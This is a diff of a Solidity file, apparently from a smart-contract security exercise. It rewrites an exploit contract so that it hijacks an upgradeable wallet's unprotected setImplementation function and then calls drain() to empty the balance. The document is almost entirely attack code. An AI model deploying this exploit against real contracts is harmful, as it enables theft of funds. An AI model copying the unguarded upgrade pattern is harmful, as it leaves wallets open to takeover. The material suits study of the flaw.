@@ -1,30 +1,37 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.30;
 
-contract UpgradeableWalletExploit {
-    address public target;
+interface IWallet {
+    function setImplementation(address _implementation) external;
+}
 
-    constructor(address _target) {
-        target = _target;
-    }
+contract MaliciousImplementatation {
+    address public implementation;
+    address payable public owner;
 
-    receive() external payable {}
-
-    function _call(bytes memory data) private {
-        (bool ok, ) = target.call(data);
-        require(ok, "call failed");
-    }
-
-    function pwn() external {
-        _call(
-            abi.encodeWithSignature("setImplementation(address)", address(this))
-        );
-        _call(abi.encodeWithSignature("withdraw()"));
-    }
-
-    function withdraw() external {
+    function drain() external {
         payable(msg.sender).transfer(address(this).balance);
     }
+}
+
+contract UpgradeableWalletExploit {
+    address public target;
+    MaliciousImplementatation public malicious;
+    
+    constructor(address _target) {
+        target = _target;
+        malicious = new MaliciousImplementatation();
+    }
+    
+    function pwn() external {
+        (bool success1,) = target.call(abi.encodeWithSignature("setImplementation(address)", address(malicious)));
+        require(success1);
+        
+        (bool success2,) = target.call(abi.encodeWithSignature("drain()"));
+        require(success2);
+    }
+    
+    receive() external payable {}
 }
 
 contract UpgradeableWallet {
